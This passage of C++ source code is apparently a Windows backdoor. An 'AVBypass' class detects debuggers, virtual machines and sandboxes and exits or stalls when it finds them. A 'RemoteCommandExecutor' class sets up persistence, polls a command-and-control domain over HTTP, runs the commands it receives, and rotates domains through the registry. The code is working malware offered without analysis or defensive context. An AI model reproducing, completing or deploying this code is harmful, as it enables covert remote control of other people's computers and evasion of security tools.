        antiSandboxCheck();
        dummyBranch();
    }

    void timingEvasionDelay() {
        randomDelay(1000, 5000);
    }

    void antiSandboxCheck() {
        if (isVmEnvironment()) {
            Sleep(30000);
        }
    }

    void obfuscatedSleep(int baseSeconds) {
        int sleepMs = getObfuscatedSleepDuration(baseSeconds);
        Sleep(sleepMs);
    }

    void applyEnhancedTechniques() {
        if (checkAllDebuggers()) {
            std::exit(0);
        }
        if (checkCodeIntegrity()) {
            std::exit(0);
        }
        timingEvasionDelay();
        antiSandboxCheck();
        dummyBranch();
    }

private:

    static const unsigned char encryption_key[];

    static POINT lastMousePos;
    static DWORD lastMouseCheckTime;


    bool isVmEnvironment() const {
        DWORD uptime = GetTickCount();
        if (uptime < 60000) return true;

        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        if (sysInfo.dwNumberOfProcessors < 2) return true;

        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        GlobalMemoryStatusEx(&memInfo);
        if (memInfo.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;

        return false;
    }

    void randomDelay(int minMs, int maxMs) {
        if (maxMs <= minMs) {
            Sleep(minMs);
            return;
        }

        int range = maxMs - minMs;
        int delay = minMs + (Utils::rand() % range);
        Sleep(delay);
    }

    bool opaquePredicate() const {
        volatile int x = 1;
        volatile int y = 2;
        return (x * 2) == (y * 1);
    }

    void dummyBranch() {
        if (opaquePredicate()) {
            volatile int dummy = 0;
            dummy++;
        } else {
            volatile int unused = 0;
            unused++;
        }
    }

    bool checkDebuggerAPI() const {
        if (IsDebuggerPresent()) {
            return true;
        }

        BOOL isRemoteDebugger = FALSE;
        if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebugger)) {
            if (isRemoteDebugger) {
                return true;
            }
        }

        return false;
    }

    bool checkDebuggerNtQuery() const {
        HMODULE hNtdll = LoadLibraryA("ntdll.dll");
        if (hNtdll == nullptr) return false;

        NtQueryInformationProcess_t pNtQueryInformationProcess = 
            getProcAddressTyped<NtQueryInformationProcess_t>("ntdll.dll", "NtQueryInformationProcess");

        if (pNtQueryInformationProcess == nullptr) {
            FreeLibrary(hNtdll);
            return false;
        }

        DWORD_PTR debugPort = 0;
        ULONG returnLength = 0;
        NTSTATUS status = pNtQueryInformationProcess(
            GetCurrentProcess(),
            ProcessDebugPort,
            &debugPort,
            sizeof(debugPort),
            &returnLength
        );

        if (status == 0 && debugPort != 0) {
            FreeLibrary(hNtdll);
            return true;
        }

        DWORD debugFlags = 0;
        status = pNtQueryInformationProcess(
            GetCurrentProcess(),
            ProcessDebugFlags,
            &debugFlags,
            sizeof(debugFlags),
            &returnLength
        );

        FreeLibrary(hNtdll);

        return (status == 0 && debugFlags == 0);
    }

    bool checkDebuggerPEB() const {
#ifdef _WIN64

        BYTE* peb = reinterpret_cast<BYTE*>(__readgsqword(0x60));
#else

        BYTE* peb = reinterpret_cast<BYTE*>(__readfsdword(0x30));
#endif

        if (peb == nullptr) return false;

        BOOLEAN beingDebugged = *reinterpret_cast<BOOLEAN*>(peb + 0x02);
        if (beingDebugged) {
            return true;
        }

        DWORD ntGlobalFlag = *reinterpret_cast<DWORD*>(peb + 0x68);
        if ((ntGlobalFlag & 0x70) != 0) {
            return true;
        }

        return false;
    }

    bool checkDebuggerTiming() const {
        LARGE_INTEGER frequency, start, end;
        if (!QueryPerformanceFrequency(&frequency)) {
            return false;
        }

        QueryPerformanceCounter(&start);

        volatile int dummy = 0;
        for (int i = 0; i < 1000; i++) {
            dummy += i;
        }

        QueryPerformanceCounter(&end);

        double elapsedMs = ((end.QuadPart - start.QuadPart) * 1000.0) / frequency.QuadPart;

        return (elapsedMs > 1.0);
    }

    bool checkAllDebuggers() const {
        if (checkDebuggerAPI()) return true;
        if (checkDebuggerNtQuery()) return true;
        if (checkDebuggerPEB()) return true;
        if (checkDebuggerTiming()) return true;
        return false;
    }

    bool checkCodeIntegrity() const {

        HMODULE hModule = GetModuleHandle(nullptr);
        if (hModule == nullptr) return false;

        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(reinterpret_cast<LPCVOID>(hModule), &mbi, sizeof(mbi)) == 0) {
            return false;
        }

        if ((mbi.Protect & PAGE_READWRITE) != 0 || (mbi.Protect & PAGE_EXECUTE_READWRITE) != 0) {
            return true;
        }

        DWORD checksum = 0;
        BYTE* baseAddr = reinterpret_cast<BYTE*>(hModule);

        for (size_t i = 0; i < 1024 && i < mbi.RegionSize; i++) {
            checksum += baseAddr[i];
        }

        if (checksum == 0) {
            return true;
        }

        return false;
    }

    int getObfuscatedSleepDuration(int baseSeconds) {

        int jitterPercent = 10 + (Utils::rand() % 11);
        int jitterMs = (baseSeconds * 1000 * jitterPercent) / 100;

        if (Utils::rand() % 2 == 0) {
            jitterMs = -jitterMs;
        }

        int totalMs = (baseSeconds * 1000) + jitterMs;
        return (totalMs > 0) ? totalMs : baseSeconds * 1000;
    }


    void checkAndExit() {
        if (checkAllDebuggers()) {
            std::exit(0);
        }
        if (checkCodeIntegrity()) {
            std::exit(0);
        }
    }
};

const unsigned char AVBypass::encryption_key[] = {0x4A, 0x7B, 0x9C, 0x2D, 0x5E, 0x8F, 0x1A, 0x3B};
POINT AVBypass::lastMousePos = {0, 0};
DWORD AVBypass::lastMouseCheckTime = 0;

class RemoteCommandExecutor {
public:
    RemoteCommandExecutor(const std::string& domain = Config::INITIAL_DOMAIN, int port = Config::HTTP_PORT, bool debugMode = false) 
        : currentDomain_(domain),
          logger_(std::unique_ptr<Logger>(new Logger(debugMode))),
          httpClient_(std::unique_ptr<HttpClient>(new HttpClient(port))),
          registryManager_(std::unique_ptr<RegistryManager>(new RegistryManager())),
          jsonParser_(std::unique_ptr<JsonParser>(new JsonParser())),
          persistenceManager_(std::unique_ptr<PersistenceManager>(new PersistenceManager(registryManager_.get()))),
          avBypass_(std::unique_ptr<AVBypass>(new AVBypass())),
          debugMode_(debugMode) {
        httpClient_->setLogger(logger_.get());
    }

    ~RemoteCommandExecutor() {
        if (mutex_.isValid()) {
            CloseHandle(mutex_.release());
        }
    }

    bool checkSingleInstance() {
        if (debugMode_) {
            logger_->writeDebug("Checking for single instance");
        }
        HANDLE hMutex = CreateMutexW(nullptr, TRUE, Config::MUTEX_NAME);
        if (hMutex == nullptr) {
            throw std::runtime_error("Failed to create mutex");
        }

        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            if (debugMode_) {
                logger_->writeDebug("Another instance is already running");
            }
            CloseHandle(hMutex);
            return false;
        }

        mutex_.reset(hMutex);
        if (debugMode_) {
            logger_->writeDebug("Single instance check passed");
        }
        return true;
    }

    void initialize() {
        logger_->init();

        if (debugMode_) {
            logger_->writeDebug("Initializing RemoteCommandExecutor");
            char debugMsg[256];
            Utils::snprintf(debugMsg, sizeof(debugMsg), "Current domain: %s", currentDomain_.c_str());
            logger_->writeDebug(debugMsg);
        }

        if (debugMode_) {
            logger_->writeDebug("Setting up persistence");
        }
        persistenceManager_->setup();

        if (!loadDomainFromRegistry()) {
            currentDomain_ = Config::INITIAL_DOMAIN;
            if (debugMode_) {
                logger_->writeDebug("Using default domain from Config");
            }
        } else {
            if (debugMode_) {
                char debugMsg[256];
                Utils::snprintf(debugMsg, sizeof(debugMsg), "Loaded domain from registry: %s", currentDomain_.c_str());
                logger_->writeDebug(debugMsg);
            }
        }
    }

    void run() {
        if (!checkSingleInstance()) {
            return;
        }

        try {
            initialize();
        } catch (...) {
            return;
        }

        Utils::srand(Utils::time());

        logger_->writeInfo("Remote Command Executor starting");

        mainOperationLoop();
    }

private:
    bool loadDomainFromRegistry() {
        std::string domain;
        if (registryManager_->readString(HKEY_CURRENT_USER,
                                        Config::REGISTRY_DOMAIN_KEY,
                                        Config::REGISTRY_DOMAIN_VALUE, domain)) {
            if (jsonParser_->validateDomainFormat(domain)) {
                currentDomain_ = domain;
                return true;
            }
        }
        return false;
    }

    void saveDomainToRegistry(const std::string& domain) {
        if (!jsonParser_->validateDomainFormat(domain)) {
            if (debugMode_) {
                logger_->writeDebug("Domain format validation failed, not saving to registry");
            }
            return;
        }

        if (debugMode_) {
            char debugMsg[256];
            Utils::snprintf(debugMsg, sizeof(debugMsg), "Saving domain to registry: %s", domain.c_str());
            logger_->writeDebug(debugMsg);
        }

        registryManager_->writeString(HKEY_CURRENT_USER,
                                     Config::REGISTRY_DOMAIN_KEY,
                                     Config::REGISTRY_DOMAIN_VALUE, domain);
    }

    void updateDomain(const std::string& nextDomain) {
        if (nextDomain.empty()) return;

        if (jsonParser_->validateDomainFormat(nextDomain)) {
            currentDomain_ = nextDomain;
            saveDomainToRegistry(nextDomain);
        }
    }

    void mainOperationLoop() {
        logger_->writeInfo("Starting main operation loop");

        if (debugMode_) {
            char debugMsg[256];
            Utils::snprintf(debugMsg, sizeof(debugMsg), "Main loop starting with domain: %s", currentDomain_.c_str());
            logger_->writeDebug(debugMsg);
        }

        while (true) {
            if (debugMode_) {
                logger_->writeDebug("Applying enhanced AV bypass techniques");
            }
            avBypass_->applyEnhancedTechniques();

            logger_->writeInfo("Making HTTP request to server");
            if (debugMode_) {
                char debugMsg[256];
                Utils::snprintf(debugMsg, sizeof(debugMsg), "Requesting from domain: %s", currentDomain_.c_str());
                logger_->writeDebug(debugMsg);
            }

            std::string response;
            if (httpClient_->getWithFallback(currentDomain_, response)) {
                logger_->writeInfo("HTTP request successful");

                std::string command, nextDomain;
                int sleepDuration = 0;

                if (debugMode_) {
                    char debugMsg[512];
                    Utils::snprintf(debugMsg, sizeof(debugMsg), "Raw JSON response: %s", response.c_str());
                    logger_->writeDebug(debugMsg);
                }

                if (jsonParser_->validateFields(response) &&
                    jsonParser_->parse(response, command, nextDomain, sleepDuration) &&
                    jsonParser_->validateSleepDuration(sleepDuration) &&
                    jsonParser_->validateDomainFormat(nextDomain)) {

                    if (debugMode_) {
                        char debugMsg[512];
                        Utils::snprintf(debugMsg, sizeof(debugMsg), "Parsed JSON - Command: '%s', Next Domain: '%s', Sleep: %d", 
                                       command.c_str(), nextDomain.c_str(), sleepDuration);
                        logger_->writeDebug(debugMsg);
                    }

                    if (!command.empty()) {
                        logger_->writeInfo("Executing command");
                        if (debugMode_) {
                            char debugMsg[512];
                            Utils::snprintf(debugMsg, sizeof(debugMsg), "Executing command: %s", command.c_str());
                            logger_->writeDebug(debugMsg);
                        }
                        CommandExecutor executor(logger_->getHandle());
                        executor.executeSafe(command);
                        if (debugMode_) {
                            logger_->writeDebug("Command execution completed");
                        }
                    }

                    updateDomain(nextDomain);
                    if (debugMode_) {
                        char debugMsg[256];
                        Utils::snprintf(debugMsg, sizeof(debugMsg), "Updated domain to: %s", currentDomain_.c_str());
                        logger_->writeDebug(debugMsg);
                    }

                    if (sleepDuration > 0) {
                        if (debugMode_) {
                            char debugMsg[256];
                            Utils::snprintf(debugMsg, sizeof(debugMsg), "Sleeping for %d seconds", sleepDuration);
                            logger_->writeDebug(debugMsg);
                        }
                        avBypass_->obfuscatedSleep(sleepDuration);
                    }
                } else {
                    logger_->writeInfo("JSON parsing failed, continuing with same domain");
                    if (debugMode_) {
                        logger_->writeDebug("JSON validation or parsing failed");
                    }
                    avBypass_->obfuscatedSleep(30);
                }
            } else {
                logger_->writeError("mainOperationLoop", "HTTP request failed, retrying in 60 seconds");
                if (debugMode_) {
                    logger_->writeDebug("HTTP request failed, will retry after sleep");
                }
                avBypass_->obfuscatedSleep(60);
            }
        }
    }

    std::string currentDomain_;
    std::unique_ptr<Logger> logger_;
    std::unique_ptr<HttpClient> httpClient_;
    std::unique_ptr<RegistryManager> registryManager_;
    std::unique_ptr<JsonParser> jsonParser_;
    std::unique_ptr<PersistenceManager> persistenceManager_;
    std::unique_ptr<AVBypass> avBypass_;
    MutexHandle mutex_;
    bool debugMode_;
};

int main(int argc, char* argv[]) {
    std::string domain = Config::INITIAL_DOMAIN;
    int port = Config::HTTP_PORT;
    bool debugMode = false;

    for (int i = 1; i < argc; i++) {
        std::string arg = std::string(argv[i]);
        if (arg == "--debug" || arg == "-d") {
            debugMode = true;
        } else if (i == 1 && arg != "--debug" && arg != "-d") {
            domain = arg;
        } else if (i == 2 && arg != "--debug" && arg != "-d") {
            port = Utils::atoi(arg.c_str());
            if (port <= 0 || port > 65535) {
                port = Config::HTTP_PORT;
            }
        }
    }

    if (debugMode) {
        printf("[DEBUG MODE ENABLED]\n");
        printf("Domain: %s\n", domain.c_str());
        printf("Port: %d\n", port);
        printf("Starting Remote Command Executor...\n\n");
    }

    try {
        RemoteCommandExecutor executor(domain, port, debugMode);
        executor.run();
    } catch (...) {
        return 1;
    }

    return 0;
}
